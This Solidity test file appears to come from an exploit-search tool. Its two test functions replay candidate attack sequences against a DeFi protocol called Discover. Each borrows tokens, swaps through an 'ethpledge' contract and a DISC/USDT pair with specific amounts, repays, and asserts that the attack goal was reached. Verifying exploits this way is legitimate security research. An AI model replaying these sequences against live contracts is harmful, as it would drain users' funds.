// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./Discover.t.sol";

contract DiscoverVerify is DiscoverTest {
    function test_verify_cand001_0() public {
        uint256 amt0 = 0x103f08008a00800000002;
        uint256 amt1 = 0x3aa8259ef6e9da00005;
        uint256 amt2 = 0x757d87e1e024a6ef59b2;
        uint256 amt3 = 0x103f4673c028f142005dc;
        borrow_usdt(amt0);
        swap_ethpledge_usdt_disc(amt1);
        swap_pair_disc_usdt(amt2);
        payback_usdt(amt3);
        require(attackGoal(), "Attack failed!");
    }

    function test_verify_cand003_0() public {
        uint256 amt0 = 0x1000000000000000000001;
        uint256 amt1 = 0xeb817cba9d94bdeb2cc;
        uint256 amt2 = 0x332001cf8442ca6aaad;
        uint256 amt3 = 0x100003e7336287142005db;
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_disc(amt3);
        require(attackGoal(), "Attack failed!");
    }
}
